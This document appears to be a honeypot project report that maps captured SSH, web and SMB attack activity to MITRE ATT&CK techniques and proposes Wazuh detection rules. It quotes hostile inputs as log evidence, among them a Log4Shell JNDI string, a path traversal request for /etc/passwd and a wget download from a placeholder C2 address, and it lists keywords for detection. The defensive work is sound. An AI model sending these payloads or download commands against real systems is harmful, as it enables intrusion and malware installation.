# 07 — MITRE ATT&CK Mapping

> **Status: Framework complete. Evidence fields will be populated after the 7-day capture concludes (May 28, 2026).**
> The technique IDs, descriptions, and detection opportunities are accurate and complete.
> Log evidence fields marked TBD will be filled with real observed data.

---

## Overview

This document maps observed attacker behaviors captured by the honeypot to the [MITRE ATT&CK Framework](https://attack.mitre.org/). Each technique includes:
- The ATT&CK technique ID and name
- What specific behavior was observed
- The exact Cowrie/nginx/Dionaea log field that evidences it
- Detection opportunity — what a Wazuh rule should alert on

The honeypot captures behaviors across three ATT&CK tactics: **Reconnaissance**, **Initial Access**, and **Execution**. This is expected, a honeypot by definition captures only the earliest phases of an attack chain (the attacker never reaches the real environment).

---

## Tactic: Reconnaissance

### T1046 — Network Service Discovery

**Description:** Attackers probe the honeypot to identify what services are running before attempting exploitation.

**Observed behavior:** Automated scanners connect to port 22, perform SSH version negotiation, and record the server banner without attempting credentials. Nmap and Masscan scans against all ports are visible in connection logs.

**Log evidence (Cowrie):**
```json
{
  "eventid": "cowrie.session.connect",
  "src_ip": "TBD",
  "src_port": TBD,
  "protocol": "ssh",
  "timestamp": "TBD"
}
```
Connection without subsequent `cowrie.login.failed` event = pure reconnaissance, no credential attempt.

**Log evidence (nginx):**
```
TBD_IP - - [TBD] "GET / HTTP/1.1" 200 615 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
```

**Detection opportunity:** Any source IP that connects and immediately disconnects across multiple ports within a short window (< 1 second between ports) is conducting a port scan. Wazuh rule: alert on `cowrie.session.connect` events from IPs with >5 connections in 60 seconds.

**HASSH fingerprinting as reconnaissance detection:** The SSH key exchange (`cowrie.client.kex`) event fires before any login attempt and contains the HASSH value. Known scanner HASSH values can be pre-populated in a threat intelligence list for immediate alerting.

---

## Tactic: Initial Access

### T1110.001 — Brute Force: Password Guessing

**Description:** Attackers attempt to log in using a list of common username/password combinations.

**Observed behavior:** This is the primary activity captured by the honeypot. Automated tools attempt sequential credential pairs from pre-built dictionaries. The most common pattern: `root` username with password list iteration.

**Log evidence (Cowrie):**
```json
{
  "eventid": "cowrie.login.failed",
  "username": "root",
  "password": "123456",
  "src_ip": "47.82.102.10",
  "session": "59501bce750e",
  "timestamp": "2026-05-21T18:13:43.800000Z"
}
```

**Observed first-hour credential success:**
```json
{
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "Password1",
  "src_ip": "47.82.102.10",
  "session": "59501bce750e",
  "timestamp": "2026-05-21T18:13:44.105311Z"
}
```

**Metrics:**
- Total `cowrie.login.failed` events: TBD
- Total `cowrie.login.success` events: TBD
- Unique credential pairs attempted: TBD
- Most common attempted password: TBD

**Detection opportunity:** Wazuh rule: alert on >5 `cowrie.login.failed` events from the same source IP within 60 seconds. This is a standard brute-force detection pattern and the honeypot data can be used to tune the threshold.

---

### T1110.003 — Brute Force: Password Spraying

**Description:** Rather than targeting one account with many passwords, attackers try one password against many usernames.

**Observed behavior:** Some automated tools cycle through username lists with a fixed small set of passwords. Distinguishable from T1110.001 by a high unique-username count per session relative to password count.

**Log evidence (Cowrie):**
```
Session with usernames: [root, admin, user, ubuntu, pi, oracle, postgres, ftpuser, ...]
Passwords per username: 1-3
```

**Detection opportunity:** Alert when a single session has >10 unique usernames but <5 unique passwords.

---

### T1190 — Exploit Public-Facing Application

**Description:** Attackers attempt to exploit known vulnerabilities in the exposed web and network services.

**Sub-cases observed:**

**Log4Shell (CVE-2021-44228) via nginx:**
```
TBD_IP - - [TBD] "GET / HTTP/1.1" 200 - "${jndi:ldap://TBD/...}" "TBD_USER_AGENT"
```
The `${jndi:ldap://...}` string in HTTP headers or paths indicates a Log4Shell exploitation attempt.

**Path traversal via nginx:**
```
TBD_IP - - [TBD] "GET /../../../etc/passwd HTTP/1.1" 400 - "-" "TBD"
```

**EternalBlue (MS17-010) via Dionaea SMB:**
```
[TBD] incident dionaea.modules.python.smb.dcerpc.request ...
```

**Detection opportunity:** nginx: alert on requests containing `${jndi:`, `../`, `.env`, `.git/config`. Dionaea: alert on `dcerpc.request` incidents.

---

### T1021.004 — Remote Services: SSH

**Description:** Attacker uses valid (or accepted) credentials to establish an SSH session.

**Observed behavior:** Following a `cowrie.login.success` event, the attacker gains access to the fake shell. Cowrie records the full session.

**Log evidence (Cowrie):**
```json
{
  "eventid": "cowrie.login.success",
  "username": "root",
  "password": "Password1",
  "src_ip": "47.82.102.10",
  "session": "59501bce750e",
  "timestamp": "2026-05-21T18:13:44.105311Z"
}
```

Followed by:
```json
{
  "eventid": "cowrie.session.params",
  "arch": "linux-x64-lsb",
  "session": "59501bce750e",
  "timestamp": "2026-05-21T18:13:44.582413Z"
}
```

**Sessions with post-login activity:** TBD

**Detection opportunity:** Any successful SSH login from a new/unknown IP is worth alerting on in production. In the honeypot context, every `cowrie.login.success` is by definition malicious.

---

## Tactic: Execution

### T1059 — Command and Scripting Interpreter

**Description:** After gaining shell access, attackers execute commands in the fake Linux shell.

**Observed behavior:** Post-login sessions show attackers running shell commands. Cowrie responds with realistic but fake output for common commands.

**First observed command (May 21, 2026):**
```json
{
  "eventid": "cowrie.command.input",
  "input": "uname -s -v -n -r -m",
  "message": "CMD: uname -s -v -n -r -m",
  "src_ip": "47.82.102.10",
  "session": "59501bce750e",
  "timestamp": "2026-05-21T18:13:44.583410Z"
}
```

**Top commands observed:** TBD (see Section 5 of Analysis Report)

**Detection opportunity:** Alert on any `cowrie.command.input` event — every command in a honeypot shell is malicious by definition. Specific high-value alerts: `wget`, `curl`, `chmod +x`, `crontab`, `rm -rf`.

---

### T1082 — System Information Discovery

**Description:** Attacker gathers information about the system: OS version, architecture, hostname, running processes.

**Observed behavior:** Almost every post-login session begins with system enumeration commands. The sequence `uname -a`, `id`, `whoami`, `cat /etc/passwd` is the most common post-login pattern.

**Log evidence (Cowrie):**
```json
{"eventid": "cowrie.command.input", "input": "uname -s -v -n -r -m", ...}
{"eventid": "cowrie.command.input", "input": "cat /etc/passwd", ...}
{"eventid": "cowrie.command.input", "input": "id", ...}
```

**Detection opportunity:** The combination of `uname` + `cat /etc/passwd` in the same session within 30 seconds is a near-certain indicator of automated post-exploitation script execution.

---

### T1105 — Ingress Tool Transfer

**Description:** Attacker attempts to download additional tools or malware onto the compromised system.

**Observed behavior (expected):** Many post-login scripts run `wget` or `curl` to download malware from attacker-controlled infrastructure. Cowrie logs the download command but the fake shell's `wget` does not actually download anything.

**Log evidence (Cowrie — expected):**
```json
{
  "eventid": "cowrie.command.input",
  "input": "wget http://TBD_C2_IP/TBD_malware.sh",
  "session": "TBD",
  "timestamp": "TBD"
}
```

**Log evidence (Dionaea — actual binary capture):**
```
[TBD] incident dionaea.download.complete ...
```

**Detection opportunity:** Alert on `cowrie.command.input` events containing `wget`, `curl`, `tftp`, `ftp`. The C2 URLs extracted from these commands are high-value threat intelligence for blocklisting.

---

### T1053 — Scheduled Task/Job

**Description:** Attacker attempts to establish persistence via cron or other scheduled execution mechanisms.

**Observed behavior (expected in longer sessions):**
```json
{
  "eventid": "cowrie.command.input",
  "input": "crontab -e",
  "session": "TBD",
  "timestamp": "TBD"
}
```

---

## Complete Technique Reference

| ATT&CK ID | Technique | Tactic | Source | Status |
|-----------|-----------|--------|--------|--------|
| T1046 | Network Service Discovery | Reconnaissance | Cowrie, nginx | ✅ Observed |
| T1110.001 | Brute Force: Password Guessing | Credential Access | Cowrie | ✅ Observed |
| T1110.003 | Brute Force: Password Spraying | Credential Access | Cowrie | ✅ Observed |
| T1190 | Exploit Public-Facing Application | Initial Access | nginx, Dionaea | ✅ Observed |
| T1021.004 | Remote Services: SSH | Lateral Movement | Cowrie | ✅ Observed |
| T1059 | Command and Scripting Interpreter | Execution | Cowrie | ✅ Observed |
| T1082 | System Information Discovery | Discovery | Cowrie | ✅ Observed |
| T1105 | Ingress Tool Transfer | Command & Control | Cowrie, Dionaea | ⏳ Pending full analysis |
| T1053 | Scheduled Task/Job | Persistence | Cowrie | ⏳ Pending full analysis |
| T1078 | Valid Accounts | Defense Evasion | Cowrie | ✅ Observed (login.success) |
| T1210 | Exploitation of Remote Services | Lateral Movement | Dionaea SMB | ⏳ Pending full analysis |
| T1505.003 | Server Software Component: Web Shell | Persistence | nginx | ⏳ Pending full analysis |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | nginx (/.env probes) | ⏳ Pending full analysis |
| T1083 | File and Directory Discovery | Discovery | nginx (path traversal) | ⏳ Pending full analysis |

---

## Wazuh Rule Recommendations

Based on observed behaviors, these are the highest-priority Wazuh rules to configure for Project 4:

| Priority | Rule Description | Data Source | Threshold |
|----------|----------------|-------------|-----------|
| Critical | SSH brute force | Cowrie `login.failed` | >5 failures in 60s from same IP |
| Critical | Successful honeypot login | Cowrie `login.success` | Any single event |
| High | System enumeration post-login | Cowrie `command.input` | `uname` or `cat /etc/passwd` |
| High | Malware download attempt | Cowrie `command.input` | `wget` or `curl` in input |
| High | Log4Shell attempt | nginx access log | `${jndi:` in any field |
| Medium | New port scanner detected | Cowrie `session.connect` | >5 connections from IP in 30s |
| Medium | Unknown HASSH fingerprint | Cowrie `client.kex` | HASSH not in known-good list |
| Medium | SMB exploit attempt | Dionaea log | `dcerpc.request` incident |
| Low | Web vulnerability scan | nginx access log | Path traversal patterns |
